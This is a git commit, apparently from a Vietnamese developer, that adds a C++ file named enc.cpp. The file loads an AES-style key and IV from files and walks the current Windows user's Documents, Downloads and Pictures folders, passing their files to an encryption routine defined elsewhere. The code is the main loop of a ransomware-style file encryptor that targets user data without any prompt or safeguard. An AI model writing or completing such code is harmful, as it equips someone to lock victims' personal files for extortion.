7fe7b6755403f7215e22afb50689e533bc59df26
ng0cph0ng <fogsbuddha@gmail.com>
2024-04-27 07:29:27 +0700

    encrypt

---
+++ src/enc.cpp
@@ -0,0 +1,27 @@
+#include "function.cpp"
+
+int main()
+{
+    uint8_t key[16];
+    uint8_t iv[16];
+
+    readFromFile(keyFilename, key, size);
+    readFromFile(ivFilename, iv, size);
+
+    std::string username = getCurrentUsername();
+    std::string path = "C:\\Users\\" + username + "\\";
+    
+    // Các thư mục cần xem
+    std::vector<std::string> folders = { "Documents", "Downloads", "Pictures" };
+    
+    for (const auto& folder : folders) {
+        std::string folderPath = path + folder + "\\";
+
+        // Liệt kê các tệp và thư mục trong thư mục hiện tại
+        std::vector<FileItem> items = listFilesAndDirectories(folderPath);
+        
+        enc(items, "", folderPath, key, iv);
+    }
+    
+    return 0;
+}
